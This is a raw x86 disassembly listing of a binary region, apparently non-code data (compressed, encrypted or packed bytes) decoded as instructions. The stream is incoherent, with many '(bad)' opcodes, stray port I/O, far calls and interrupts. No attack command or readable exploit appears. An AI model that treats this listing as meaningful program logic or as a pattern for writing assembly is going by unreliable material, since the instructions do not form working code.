  4194a2:	mov    ds:0x8e2b43fd,al
  4194a7:	sbb    al,dh
  4194a9:	test   eax,0x2606fcd1
  4194ae:	test   DWORD PTR [edi-0x68],esp
  4194b1:	cmp    al,0x8e
  4194b3:	fidiv  WORD PTR [ebx-0x5172da19]
  4194b9:	retf   
  4194ba:	inc    BYTE PTR [edx+0x240dd6a4]
  4194c0:	push   es
  4194c1:	ret    
  4194c2:	sbb    dl,BYTE PTR [ebx+0x6b26e685]
  4194c8:	imul   ecx,esp,0xffffff9c
  4194cb:	lahf   
  4194cc:	icebp  
  4194cd:	mov    bh,0x1b
  4194cf:	mov    edi,0xf5840f29
  4194d4:	mov    ds:0x7660331f,al
  4194d9:	adc    al,0xe5
  4194db:	mov    dh,BYTE PTR [esi]
  4194dd:	jae    0x4194a0
  4194df:	out    0x42,al
  4194e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e3:	sbb    ch,BYTE PTR [ecx]
  4194e5:	call   0x76f3:0x85df5b43
  4194ec:	dec    eax
  4194ed:	adc    cl,ah
  4194ef:	cwde   
  4194f0:	repnz sub BYTE PTR [ecx+0x382e9ec7],dl
  4194f7:	lock fcmovne st,st(1)
  4194fa:	xchg   BYTE PTR [ebx-0x3c2cb00e],cl
  419500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419501:	scas   al,BYTE PTR es:[edi]
  419502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419503:	adc    al,0xed
  419505:	push   esi
  419506:	mov    DWORD PTR [eax-0x6b],0x8f44092
  41950d:	sti    
  41950e:	mov    cl,0xca
  419510:	xchg   DWORD PTR [edx+eiz*2+0x659fef],edx
  419517:	fistp  DWORD PTR [eax+0x6eb58fc3]
  41951d:	cmp    edi,DWORD PTR [edi-0x7819a2c0]
  419523:	push   cs
  419524:	push   ss
  419525:	daa    
  419526:	fs jae 0x419566
  419529:	mov    esp,0x2486472
  41952e:	jecxz  0x419579
  419530:	dec    esi
  419531:	in     al,dx
  419532:	(bad)  
  419533:	into   
  419534:	fidiv  DWORD PTR [edx-0x55]
  419537:	adc    bh,ah
  419539:	jno    0x41956e
  41953b:	jo     0x4194c3
  41953d:	xlat   BYTE PTR ds:[ebx]
  41953e:	push   ss
  41953f:	or     DWORD PTR [edx+0x24],ecx
  419542:	daa    
  419543:	inc    edx
  419544:	pop    esi
  419545:	mov    al,0x92
  419547:	test   al,0x67
  419549:	sub    edx,DWORD PTR [ebx]
  41954b:	(bad)  
  41954c:	into   
  41954d:	push   esi
  41954e:	mov    ch,0x72
  419550:	jmp    0x4195c0
  419552:	adc    eax,0x7066e1c8
  419557:	in     al,0x80
  419559:	retf   0xbff9
  41955c:	add    al,0x3d
  41955e:	dec    esp
  41955f:	mul    DWORD PTR [edi]
  419561:	pop    esi
  419562:	inc    esi
  419563:	sub    BYTE PTR [esi+0x48],bl
  419566:	mov    bh,0x91
  419568:	arpl   WORD PTR [ebp+esi*1+0xf270b1b],si
  41956f:	jns    0x419574
  419571:	fadd   st(4),st
  419573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419574:	xchg   edx,eax
  419575:	mov    dl,0x28
  419577:	clc    
  419578:	(bad)  
  419579:	fwait
  41957a:	cmp    DWORD PTR [ebx+ecx*1+0x18f2ca9a],eax
  419581:	push   0xeaea4c9c
  419586:	mov    dl,0x5a
  419588:	std    
  419589:	inc    edi
  41958a:	push   ebp
  41958b:	pop    ds
  41958c:	or     ebp,DWORD PTR [ebp-0x327a48b3]
  419592:	cmp    edx,DWORD PTR [esi*2-0x6cf850dc]
  419599:	sbb    esp,DWORD PTR [ebx+0x6e479b73]
  41959f:	stos   DWORD PTR es:[edi],eax
  4195a0:	jb     0x419530
  4195a2:	xchg   ebp,eax
  4195a3:	icebp  
  4195a4:	xor    al,BYTE PTR ds:0x1cadb160
  4195aa:	mov    ah,0xdc
  4195ac:	xor    al,0xe3
  4195ae:	xchg   ebp,eax
  4195af:	in     al,dx
  4195b0:	or     eax,0xdf806fd3
  4195b5:	int    0xb0
  4195b7:	sbb    dl,BYTE PTR [eax+0x1b]
  4195ba:	add    BYTE PTR [ebp+0x45],dh
  4195bd:	ins    BYTE PTR es:[edi],dx
  4195be:	push   cs
  4195bf:	mov    bh,0xd6
  4195c1:	mov    cs,WORD PTR [ecx-0x1cd09fbe]
  4195c7:	mov    bh,0x20
  4195c9:	pop    ebp
  4195ca:	push   eax
  4195cb:	or     edi,DWORD PTR [eax]
  4195cd:	mov    DWORD PTR [ebx],ebx
  4195cf:	and    edi,DWORD PTR [ebx]
  4195d1:	fisubr WORD PTR [eax]
  4195d3:	pop    esi
  4195d4:	jno    0x41957e
  4195d6:	inc    edx
  4195d7:	jbe    0x4195c4
  4195d9:	sub    ebp,edx
  4195db:	mov    ecx,DWORD PTR [esp+ecx*2-0x6d]
  4195df:	imul   ebx,DWORD PTR [edi+0x2c4dbabd],0xffffffc7
  4195e6:	fwait
  4195e7:	xchg   ebx,eax
  4195e8:	mov    dl,BYTE PTR [edi]
  4195ea:	(bad)  
  4195eb:	pop    ebx
  4195ec:	mov    esi,0x8f67148d
  4195f1:	mov    esp,0xdc3d9423
  4195f6:	and    eax,0x37366b6d
  4195fb:	leave  
  4195fc:	les    esi,FWORD PTR [esi]
  4195fe:	cli    
  4195ff:	pop    es
  419600:	(bad)  
  419602:	test   eax,0xa9e31c3b
  419607:	push   esp
  419608:	inc    edi
  419609:	bound  ebx,QWORD PTR [esi+0x364b891b]
  41960f:	fild   WORD PTR [eax+esi*4+0x50b365e4]
  419616:	jmp    0x76800565
  41961b:	leave  
  41961c:	ficom  WORD PTR [edi-0x14]
  41961f:	popf   
  419620:	pop    esi
  419621:	test   BYTE PTR [ebp-0x7b],0x94
  419625:	lahf   
  419626:	add    al,0x30
  419628:	lea    edx,[ecx-0x37]
  41962b:	xchg   ebx,eax
  41962c:	out    0x3a,al
  41962e:	fisttp QWORD PTR [esi+0x7a]
  419631:	mov    ds:0x855fca1b,eax
  419636:	and    al,0x91
  419638:	jmp    0xe3db0ed8
  41963d:	lods   al,BYTE PTR ds:[esi]
  41963e:	xchg   esi,eax
  41963f:	jo     0x419678
  419641:	mov    ds,WORD PTR [edx]
  419643:	shl    DWORD PTR [eax-0x7c731f],cl
  419649:	push   edi
  41964a:	xor    al,0x78
  41964c:	inc    esi
  41964d:	call   0xa991:0x303c1c22
  419654:	mov    al,ds:0xf062cb15
  419659:	test   eax,0x4e24dbfb
  41965e:	rcr    esp,1
  419660:	jae    0x419654
  419662:	and    eax,0x4b05ec30
  419667:	bound  ebp,QWORD PTR [eax+0x6a58235a]
  41966d:	push   edx
  41966e:	or     bl,dl
  419670:	jnp    0x4196e2
  419672:	add    DWORD PTR [ebx+eax*2-0x6932089e],esp
  419679:	pop    esp
  41967a:	sar    DWORD PTR [edx-0x35],1
  41967d:	mov    ds:0x4f4b062e,eax
  419682:	fs addr16 or eax,0xb42cdbd9
  419689:	and    al,0x80
  41968b:	mov    ah,0x8a
  41968d:	js     0x4196e3
  41968f:	loope  0x41966a
  419691:	xchg   ecx,eax
  419692:	add    BYTE PTR [esi],ch
  419694:	fsubr  st(3),st
  419696:	add    BYTE PTR [esi],ah
  419698:	or     ebp,ebp
  41969a:	js     0x41967f
  41969c:	fisubr WORD PTR [ebp+edx*8+0x7fbc7d92]
  4196a3:	cmp    BYTE PTR [esi+0x3b],0xcf
  4196a7:	bound  edx,QWORD PTR [ebx+0x7dd400ab]
  4196ad:	mov    bh,0x96
  4196af:	push   es
  4196b0:	cwde   
  4196b1:	and    ebx,DWORD PTR [ecx+0x65]
  4196b4:	xor    eax,0x91f9b7de
  4196b9:	mov    eax,0x3e98f90
  4196be:	in     al,dx
  4196bf:	out    dx,eax
  4196c0:	in     eax,0xc5
  4196c2:	mov    dl,0x80
  4196c4:	retf   
  4196c5:	jbe    0x41973a
  4196c7:	and    BYTE PTR [ebp-0xb],0xdc
  4196cb:	mov    ds:0x67061ecc,al
  4196d0:	sar    DWORD PTR [eax],0x29
  4196d3:	mov    WORD PTR [edi+0x7e507ec4],ss
  4196d9:	(bad)  
  4196da:	int    0xce
  4196dc:	lea    ecx,[edi-0xdf7a54c]
  4196e2:	sub    BYTE PTR [edi],al
  4196e4:	mov    bl,0x4a
  4196e6:	xor    bl,BYTE PTR [eax]
  4196e8:	xor    eax,0xdab1b621
  4196ed:	push   ecx
  4196ee:	nop
  4196ef:	pop    eax
  4196f0:	sub    al,0x3b
  4196f2:	mov    esp,0xeb8b53e8
  4196f7:	(bad)  
  4196f8:	in     al,dx
  4196f9:	aad    0xf0
  4196fb:	mov    ds,WORD PTR [edi-0x3e7f8981]
  419701:	test   edi,0xa4b7d6d3
  419707:	fbstp  TBYTE PTR [edi-0x3c]
  41970a:	sbb    edx,DWORD PTR [edi-0x79]
  41970d:	mov    eax,ds:0xcedf514d
  419712:	fdiv   QWORD PTR [esi]
  419714:	iret   
  419715:	adc    esp,ecx
  419717:	ss mov eax,0x129a740c
  41971d:	inc    esp
  41971e:	inc    ebp
  41971f:	sbb    esp,DWORD PTR [ebx+ebx*4-0x25]
  419723:	test   DWORD PTR [ebx-0x585bbf39],0xeb952412
  41972d:	int    0x4d
  41972f:	pop    eax
  419730:	in     eax,0x4b
  419732:	loope  0x419794
  419734:	adc    dl,bl
  419736:	jge    0x41972b
  419738:	js     0x4197aa
  41973a:	or     eax,0xbdc44915
  41973f:	pop    esp
  419740:	lods   eax,DWORD PTR ds:[esi]
  419741:	and    al,0x2f
  419743:	(bad)  
  419744:	pushf  
  419745:	mov    edx,0x9d7f6877
  41974a:	pop    eax
  41974b:	dec    ebx
  41974c:	inc    ebp
  41974d:	push   edx
  41974e:	or     eax,0x9f7a7132
  419753:	inc    eax
  419754:	and    cl,BYTE PTR [eax]
  419756:	mov    bh,0xaf
  419758:	mov    al,ds:0xd2be1e91
  41975d:	clc    
  41975e:	push   0x4f
  419760:	cli    
  419761:	call   0x7fe9d295
  419766:	cld    
  419767:	outs   dx,DWORD PTR ds:[esi]
  419768:	enter  0xeb14,0xc0
  41976c:	push   ss
  41976d:	and    eax,0xbe1ebe07
  419772:	push   ebp
  419773:	cmp    edx,esi
  419775:	lock sbb eax,0xb4a75f78
  41977b:	dec    esi
  41977c:	into   
  41977d:	dec    edx
  41977e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419780:	out    0x3e,eax
  419782:	add    eax,0x2e14ae5d
  419787:	inc    ebx
  419788:	mov    DWORD PTR [edi+0x32d1aad7],0x925d2977
  419792:	push   ds
  419793:	inc    esp
  419794:	fwait
  419795:	pop    esi
  419796:	rcl    dh,cl
  419798:	push   ebx
  419799:	mov    BYTE PTR [edx],dh
  41979b:	cs push esi
  41979d:	in     al,dx
  41979e:	aam    0xab
  4197a0:	lahf   
  4197a1:	inc    ecx
  4197a2:	in     eax,dx
  4197a3:	out    0xd7,eax
  4197a5:	retf   0x9580
  4197a8:	cld    
  4197a9:	lds    eax,FWORD PTR [ecx]
  4197ab:	inc    esp
  4197ac:	cmp    esi,DWORD PTR ds:0xb74d896d
  4197b2:	iret   
  4197b3:	sub    eax,0x5d396f72
  4197b8:	int    0x7b
  4197ba:	cmp    al,0x81
  4197bc:	mov    al,0xd6
  4197be:	mul    DWORD PTR [si+0x17]
  4197c2:	je     0x4197f3
  4197c4:	mov    eax,0x1c8920bc
  4197c9:	out    dx,eax
  4197ca:	aam    0x0
  4197cc:	push   0x34
  4197ce:	jge    0x419754
  4197d0:	std    
  4197d1:	fild   DWORD PTR [eax+0x37]
  4197d4:	cmp    ch,cl
  4197d6:	ret    
  4197d7:	mov    dl,0xef
  4197d9:	shr    DWORD PTR [edi+edi*2-0x9],0xe6
  4197de:	mov    bl,0xde
  4197e0:	or     eax,0x606b6bd
  4197e5:	jecxz  0x419769
  4197e7:	pop    ecx
  4197e8:	int    0x35
  4197ea:	ret    
  4197eb:	push   ecx
  4197ec:	push   0x35
  4197ee:	test   eax,0xe119fb8b
  4197f3:	jle    0x41978d
  4197f5:	dec    ebx
  4197f6:	xor    BYTE PTR [eax],dh
  4197f8:	push   ebx
  4197f9:	jnp    0x419831
  4197fb:	jle    0x419862
  4197fd:	xchg   edi,eax
  4197fe:	lds    edx,FWORD PTR [edx]
  419800:	pushf  
  419801:	adc    BYTE PTR [ebx-0x550cb70d],al
  419807:	mov    ebp,0xa5fd13aa
  41980c:	cmc    
  41980d:	jge    0x41983d
  41980f:	mov    ah,0x40
  419811:	fist   WORD PTR [ebx]
  419813:	pusha  
  419814:	and    esi,esp
  419816:	inc    edx
  419817:	scas   eax,DWORD PTR es:[edi]
  419818:	int    0xcd
  41981a:	jmp    0xf3a81134
  41981f:	sub    eax,edx
  419821:	add    bl,BYTE PTR [ecx+0xa]
  419824:	or     eax,0xae366d06
  419829:	and    DWORD PTR [edx],0x1b49bcfe
  41982f:	dec    edi
  419830:	mov    DWORD PTR [ebx+0x53],esp
  419833:	xor    ebx,DWORD PTR [esi-0x50]
  419836:	sbb    ebx,DWORD PTR [ebp+eax*2-0x4faf4f38]
  41983d:	call   0x88ade68d
  419842:	ds js  0x4197f8
  419845:	mov    esi,0x9fe453e1
  41984a:	je     0x419851
  41984c:	jb     0x41989e
  41984e:	cmp    DWORD PTR [ecx-0x3c],eax
  419851:	fwait
  419852:	sub    DWORD PTR [ebx-0x6c],0xd3cc393f
  419859:	and    ebx,edx
  41985b:	pop    edx
  41985c:	push   edx
  41985d:	dec    ebp
  41985e:	mov    cl,0xd8
  419860:	ds cld 
  419862:	aad    0x14
  419864:	cmp    al,0x4a
  419866:	and    eax,0x279c2b66
  41986b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986c:	sbb    al,0x3a
  41986e:	mov    esi,0xc379fa5d
  419873:	or     BYTE PTR [eax+0x54a0de8d],bl
  419879:	lds    esi,FWORD PTR [edi]
  41987b:	retf   0x2b19
  41987e:	push   ebp
  41987f:	test   al,0xb4
  419881:	xor    BYTE PTR [esi],bl
  419883:	nop
  419884:	add    BYTE PTR [edi+0x7f],ah
  419887:	clc    
  419888:	cmp    eax,0xddc3fab1
  41988d:	push   ds
  41988e:	push   0xffffffb6
  419890:	dec    ebx
  419891:	hlt    
  419892:	fimul  DWORD PTR [ebp-0x54]
  419895:	sbb    ebp,DWORD PTR [eax+0x73ae3360]
  41989b:	retf   
  41989c:	lahf   
  41989d:	xor    DWORD PTR [edi-0x28bb6c79],0x851e4020
  4198a7:	leave  
  4198a8:	fist   WORD PTR [edx]
  4198aa:	ds clc 
  4198ac:	nop
  4198ad:	mov    ebp,DWORD PTR [edi-0x22]
  4198b0:	mov    eax,DWORD PTR [ecx+0x9]
  4198b3:	int    0xd7
  4198b5:	add    dl,bl
  4198b7:	cmp    ah,BYTE PTR [eax]
  4198b9:	xlat   BYTE PTR ds:[ebx]
  4198ba:	fstp   DWORD PTR [edi-0x65]
  4198bd:	leave  
  4198be:	into   
  4198bf:	pushf  
  4198c0:	cld    
  4198c1:	retf   
  4198c2:	out    dx,eax
  4198c3:	mov    bl,0xd6
  4198c5:	dec    esp
  4198c6:	mov    ebp,0xb7e8c010
  4198cb:	inc    ecx
  4198cc:	or     BYTE PTR [edx-0x692422be],dh
  4198d2:	aam    0xfe
  4198d4:	enter  0x5d01,0xab
  4198d8:	in     al,0x5e
  4198da:	test   DWORD PTR [ecx-0x8],edx
  4198dd:	xor    edx,DWORD PTR [ebx]
  4198df:	or     eax,0xbae0774a
  4198e4:	mov    eax,0x5c22a8d9
  4198e9:	clc    
  4198ea:	inc    ecx
  4198eb:	pusha  
  4198ec:	(bad)  
  4198ed:	sti    
  4198ee:	pop    edx
  4198ef:	out    dx,al
  4198f0:	pop    gs
  4198f2:	inc    eax
  4198f3:	mov    ds:0xea99c1f0,al
  4198f8:	sbb    cl,dh
  4198fa:	bound  esi,QWORD PTR fs:[edi+0x38]
  4198fe:	sar    DWORD PTR ds:0xd00b0a3f,0xd0
  419905:	cmp    BYTE PTR [ebp-0x36],al
  419908:	mov    DWORD PTR [esi+0x286c60c2],edx
  41990e:	push   esi
  41990f:	je     0x419962
  419911:	add    dl,BYTE PTR [eax+0x6b]
  419914:	sahf   
  419915:	in     al,dx
  419916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419917:	and    al,0x5b
  419919:	mov    edi,0xa9e3d065
  41991e:	jno    0x4198bd
  419920:	ja     0x41990f
  419922:	add    edx,DWORD PTR [edx]
  419924:	add    bl,BYTE PTR [edx-0x1bad3682]
  41992a:	pop    esp
  41992b:	pop    es
  41992c:	inc    ebp
  41992d:	fs push cs
  41992f:	arpl   WORD PTR [ecx+0x16e81b4],bp
  419935:	push   cs
  419936:	fadd   QWORD PTR [eax]
  419938:	pop    ss
  419939:	adc    bh,BYTE PTR [edx]
  41993b:	loop   0x41996e
  41993d:	add    eax,eax
  41993f:	(bad)  
  419940:	not    BYTE PTR [esi+0x2bc0c7f2]
  419946:	xchg   edi,eax
  419947:	mov    dl,0x23
  419949:	mov    al,0x65
  41994b:	mov    al,ds:0x4cca27c9
  419950:	dec    edi
  419951:	fs iret 
  419953:	scas   al,BYTE PTR es:[edi]
  419954:	addr16 jmp 0x46fe89e1
  41995a:	xlat   BYTE PTR ds:[ebx]
  41995b:	inc    esp
  41995c:	dec    esp
  41995d:	xor    ah,BYTE PTR [esi-0x2ea4d02e]
  419963:	aas    
  419964:	fdivr  QWORD PTR [ebx+0x67]
  419967:	imul   esp,edx,0x29
  41996a:	scas   al,BYTE PTR es:[edi]
  41996b:	outs   dx,DWORD PTR ds:[esi]
  41996c:	mov    dh,0xf0
  41996e:	mov    eax,0x282812e9
  419973:	mov    ds:0x6f978d29,al
  419978:	and    ch,bl
  41997a:	call   0xd903:0xd19dcbc5
  419981:	and    dl,BYTE PTR [eax+0x15]
  419984:	pop    esp
  419985:	nop
  419986:	leave  
  419987:	add    DWORD PTR [ecx],edx
  419989:	clc    
  41998a:	mov    eax,0x1127d9ee
  41998f:	outs   dx,BYTE PTR ds:[esi]
	...
  419b60:	out    0xd2,al
  419b62:	xchg   esp,eax
  419b63:	icebp  
  419b64:	mov    ah,0xf7
  419b66:	out    0xd7,eax
  419b68:	aad    0x75
  419b6a:	(bad)  
  419b6b:	adc    DWORD PTR [ebx+edi*2-0x1056f070],ebp
  419b72:	add    DWORD PTR [eax],eax
  419b74:	push   ds
  419b75:	pop    es
  419b76:	add    BYTE PTR [eax],al
  419b78:	stc    
  419b79:	mov    ecx,0xa39d347d
  419b7e:	clc    
  419b7f:	dec    ecx
  419b80:	xor    eax,0x2268a8b1
  419b85:	test   al,dl
  419b87:	inc    esp
  419b88:	rcl    DWORD PTR [ecx-0x69],1
  419b8b:	addr16 push edx
  419b8d:	int    0x81
  419b8f:	and    bh,BYTE PTR [eax]
  419b91:	lds    esp,FWORD PTR [esi+0x8bf0123]
  419b97:	jecxz  0x419c0f
  419b99:	mov    ds:0x8e62e382,al
  419b9e:	xchg   esp,eax
  419b9f:	sub    BYTE PTR [ebx+0x4d448f6e],bl
  419ba5:	and    dl,BYTE PTR [esi-0x5f]
  419ba8:	add    DWORD PTR [edx+0x6f8728dd],ecx
  419bae:	push   es
  419baf:	inc    ecx
  419bb0:	dec    esp
  419bb1:	ds repnz aad 0x1d
  419bb5:	mov    dl,0xcc
  419bb7:	outs   dx,BYTE PTR ds:[esi]
  419bb8:	xchg   ebp,eax
  419bb9:	fmul   DWORD PTR [esi-0x37]
  419bbc:	jo     0x419bad
  419bbe:	cmp    eax,0xfcb7d704
  419bc3:	xlat   BYTE PTR ds:[ebx]
  419bc4:	loope  0x419c09
  419bc6:	mov    edi,0x1890f
  419bcb:	fwait
  419bcc:	pushf  
  419bcd:	mov    ch,ah
  419bcf:	ficomp DWORD PTR [ecx+0xc05d296]
  419bd5:	xchg   edi,eax
  419bd6:	pop    edx
  419bd7:	das    
  419bd8:	cs cmc 
  419bda:	mov    esi,0x13369e5b
  419bdf:	jbe    0x419b8a
  419be1:	mov    al,0x97
  419be3:	mov    edi,0xe56932c0
  419be8:	push   es
  419be9:	dec    ebp
  419bea:	bound  edi,QWORD PTR [ecx-0x287578fe]
  419bf0:	mov    bl,0x42
  419bf2:	dec    ebx
  419bf3:	mov    WORD PTR [eax],ss
  419bf5:	int3   
  419bf6:	out    dx,eax
  419bf7:	outs   dx,BYTE PTR ds:[esi]
  419bf8:	xor    al,0x61
  419bfa:	sbb    al,0x52
  419bfc:	mov    esi,0xe215a6f6
  419c01:	and    al,0x43
  419c03:	cwde   
  419c04:	aam    0x5a
  419c06:	dec    edi
  419c07:	fiadd  DWORD PTR [eax+0x69]
  419c0a:	mov    WORD PTR [esp+eax*1],?
  419c0d:	push   ecx
  419c0e:	aas    
  419c0f:	(bad)  
  419c10:	inc    esi
  419c11:	sub    DWORD PTR [edi-0x55],edx
  419c14:	je     0x419c48
  419c16:	mov    es:0x9af50037,al
  419c1c:	cmc    
  419c1d:	js     0x419c97
  419c1f:	(bad)  
  419c20:	mov    dh,0x48
  419c22:	aad    0x3
  419c24:	xchg   esp,edx
  419c26:	mov    bh,0xd2
  419c28:	mov    ebp,0x33b75753
  419c2d:	inc    esi
  419c2e:	add    edi,DWORD PTR [edi+0x3f]
  419c31:	ins    BYTE PTR es:[edi],dx
  419c32:	cmp    eax,0x79f8003
  419c37:	cdq    
  419c38:	sbb    eax,0xa4959a2c
  419c3d:	push   eax
  419c3e:	pop    ebx
  419c3f:	dec    eax
  419c40:	test   DWORD PTR [edx-0x56],eax
  419c43:	dec    ebx
  419c44:	imul   ebx,edx,0x7e757b77
  419c4a:	dec    edi
  419c4b:	and    DWORD PTR [ebx-0x3c],0x0
  419c4f:	adc    eax,0x7bbbe062
  419c54:	sbb    eax,eax
  419c56:	sahf   
  419c57:	gs xchg ebx,eax
  419c59:	stos   BYTE PTR es:[edi],al
  419c5a:	mov    ebp,0xe4d2620d
  419c5f:	push   ss
  419c60:	push   ds
  419c61:	xchg   esi,eax
  419c62:	xchg   esp,eax
  419c63:	push   0x40
  419c65:	xlat   BYTE PTR ds:[ebx]
  419c66:	jnp    0x419c02
  419c68:	loope  0x419bfd
  419c6a:	mov    DWORD PTR [ebx+edi*8],ecx
  419c6d:	arpl   WORD PTR [ebx+0x74],dx
  419c70:	sub    eax,0xb1f49205
  419c75:	in     eax,dx
  419c76:	mov    ah,BYTE PTR [ecx+0x234f4ba]
  419c7c:	nop
  419c7d:	pop    edi
  419c7e:	sbb    eax,0x8370648d
  419c83:	cmp    BYTE PTR [ebx],bl
  419c85:	sbb    DWORD PTR [esi-0x69],edi
  419c88:	mov    cl,0x72
  419c8a:	fiadd  WORD PTR [edx-0x4d]
  419c8d:	loop   0x419c35
  419c8f:	push   edx
  419c90:	imul   eax,DWORD PTR [ebx+0x14bfcea9],0xfffffffb
  419c97:	xor    al,BYTE PTR [ebx-0x46d75d6f]
  419c9d:	add    ax,0x806e
  419ca1:	sti    
  419ca2:	cmp    dl,BYTE PTR [esi+0x37]
  419ca5:	and    DWORD PTR [edx+ecx*2-0x20e3c3f],0x2c9ef0ef
  419cb0:	mov    BYTE PTR [ebx],bl
  419cb2:	cmp    al,0x2b
  419cb4:	pop    ecx
  419cb5:	stc    
  419cb6:	fist   WORD PTR [edx]
  419cb8:	pop    edi
  419cb9:	sbb    eax,0x1bff674d
  419cbe:	into   
  419cbf:	or     eax,eax
  419cc1:	cmc    
  419cc2:	adc    eax,esp
  419cc4:	call   0x3b29:0x9ded17eb
  419ccb:	repz rol BYTE PTR [ecx+0x3d295a8f],0x10
  419cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd4:	addr16 enter 0x8692,0xd6
  419cd9:	sti    
  419cda:	fdiv   DWORD PTR [esi-0x17]
  419cdd:	dec    esi
  419cde:	cmc    
  419cdf:	mov    al,0xb7
  419ce1:	sub    cl,bl
  419ce3:	or     BYTE PTR [eax*2-0x4d6e3455],al
  419cea:	into   
  419ceb:	push   esp
  419cec:	fwait
  419ced:	adc    DWORD PTR [edx-0x27],ebp
  419cf0:	add    eax,DWORD PTR [eax-0x2b781920]
  419cf6:	int    0xac
  419cf8:	sub    edi,DWORD PTR fs:[edi]
  419cfb:	into   
  419cfc:	cmp    ch,cl
  419cfe:	push   edx
  419cff:	push   ss
  419d00:	out    0xf1,al
  419d02:	sub    ah,BYTE PTR [ebp-0x54]
  419d05:	mov    bh,BYTE PTR [ebx-0x7e]
  419d08:	aaa    
  419d09:	lock jo 0x419d4e
  419d0c:	push   ecx
  419d0d:	dec    ecx
  419d0e:	add    bh,ch
  419d10:	xor    eax,0x15dc4b96
  419d15:	sbb    esi,edx
  419d17:	frstor [edx-0xa7fe71e]
  419d1d:	cdq    
  419d1e:	(bad)  
  419d20:	adc    cl,BYTE PTR [ecx+0x694072d1]
  419d26:	dec    ecx
  419d27:	adc    al,0x78
  419d29:	lea    edi,[esi+0x46]
  419d2c:	push   es
  419d2d:	sub    al,BYTE PTR [ebx+0x42b79c21]
  419d33:	inc    ecx
  419d34:	retf   
  419d35:	imul   ebx,DWORD PTR [edx-0x64023f52],0x57
  419d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d3d:	test   BYTE PTR [ebp-0x38],dl
  419d40:	xchg   DWORD PTR [edx],esp
  419d42:	or     al,0x54
  419d44:	cwde   
  419d45:	loopne 0x419cf2
  419d47:	mov    ecx,0x28920d5a
  419d4c:	mov    edi,DWORD PTR ds:0x22025e3b
  419d52:	cmp    al,0xcb
  419d54:	outs   dx,BYTE PTR ds:[esi]
  419d55:	(bad)  
  419d56:	cmp    dh,dh
  419d58:	repnz inc esi
  419d5a:	test   al,0x53
  419d5c:	jns    0x419ce7
  419d5e:	into   
  419d5f:	sahf   
  419d60:	imul   eax,DWORD PTR [ebx+0x18a7d556],0xffffffd0
  419d67:	push   0xffffff80
  419d69:	add    BYTE PTR [edx],al
  419d6b:	mov    ah,0x22
  419d6d:	push   eax
  419d6e:	scas   eax,DWORD PTR es:[edi]
  419d6f:	push   edx
  419d70:	dec    eax
  419d71:	fs pop eax
  419d73:	jbe    0x419da3
  419d75:	loopne 0x419dae
  419d77:	xchg   edi,eax
  419d78:	push   ebp
  419d79:	es iret 
  419d7b:	scas   eax,DWORD PTR es:[edi]
  419d7c:	(bad)  
  419d7e:	inc    ebx
  419d7f:	dec    edi
  419d80:	ins    DWORD PTR es:[edi],dx
  419d81:	mov    dh,0x62
  419d83:	xchg   ebp,eax
  419d84:	jo     0x419dcc
  419d86:	js     0x419d44
  419d88:	pop    ecx
  419d89:	sbb    eax,0x680d4e3
  419d8e:	xchg   DWORD PTR [eax+eiz*4+0x41],ecx
  419d92:	mov    esi,0x72992793
  419d97:	imul   eax,DWORD PTR [ebx-0xf01fffe],0xf64ae452
  419da1:	pop    ebp
  419da2:	icebp  
  419da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da4:	mov    bh,0x2e
  419da6:	(bad)  
  419da7:	xor    eax,0xda43532
  419dac:	and    eax,DWORD PTR [ebx]
  419dae:	aad    0x9e
  419db0:	dec    esp
  419db1:	add    edx,DWORD PTR [eax-0x301abbaa]
  419db7:	mov    edi,0x3d4894c
  419dbc:	and    bl,bl
  419dbe:	stos   BYTE PTR es:[edi],al
  419dbf:	sbb    BYTE PTR [ecx-0x44e1124d],al
  419dc5:	sub    DWORD PTR [eax],ecx
  419dc7:	or     eax,0xc74f6693
  419dcc:	(bad)  
  419dcd:	push   eax
  419dce:	inc    esi
  419dcf:	xchg   edi,eax
  419dd0:	out    dx,al
  419dd1:	adc    al,0xfb
  419dd3:	pop    ebx
  419dd4:	je     0x419dc0
  419dd6:	idiv   BYTE PTR [eax]
  419dd8:	fs in  eax,0xf4
  419ddb:	mov    ebx,0x7b2c8944
  419de0:	mov    bl,0xc3
  419de2:	mov    dh,BYTE PTR [eax-0x3c696ddf]
  419de8:	push   edx
  419de9:	xor    BYTE PTR [esi+0x37901948],bh
  419def:	fmul   DWORD PTR [eax]
  419df1:	push   edi
  419df2:	or     al,0x72
  419df4:	retf   0x8550
  419df7:	mov    ebx,0x905af669
  419dfc:	or     al,0x35
  419dfe:	aam    0x76
  419e00:	leave  
  419e01:	and    eax,0xde3b6faa
  419e06:	add    BYTE PTR [edi],dl
  419e08:	dec    eax
  419e09:	cs inc edx
  419e0b:	lods   al,BYTE PTR es:[esi]
  419e0d:	ror    BYTE PTR [ebx-0x19],cl
  419e10:	cdq    
  419e11:	aaa    
  419e12:	and    BYTE PTR [edi-0xa],ch
  419e15:	stos   DWORD PTR es:[edi],eax
  419e16:	jg     0x419e5b
  419e18:	cmc    
  419e19:	(bad)  
  419e1a:	repnz adc DWORD PTR [esi-0x2c],esp
  419e1e:	in     eax,0x93
  419e20:	nop
  419e21:	cmp    edi,esi
  419e23:	mov    DWORD PTR [edi+0x1b324837],esp
  419e29:	inc    ebp
  419e2a:	hlt    
  419e2b:	jmp    0x419e21
  419e2d:	push   ebx
  419e2e:	nop
  419e2f:	int    0x77
  419e31:	(bad)  
  419e32:	int    0xac
  419e34:	sub    ecx,DWORD PTR [edi]
  419e36:	adc    BYTE PTR [ebp-0x2f],ch
  419e39:	ret    0x99a4
  419e3c:	inc    eax
  419e3d:	outs   dx,BYTE PTR ds:[esi]
  419e3e:	outs   dx,BYTE PTR fs:[esi]
  419e40:	push   ds
  419e41:	xchg   ebp,eax
  419e42:	inc    eax
  419e43:	repz pop ss
  419e45:	mov    esi,DWORD PTR [edi+ecx*8+0x7b]
  419e49:	ror    BYTE PTR [ecx-0x7ae87f88],0x32
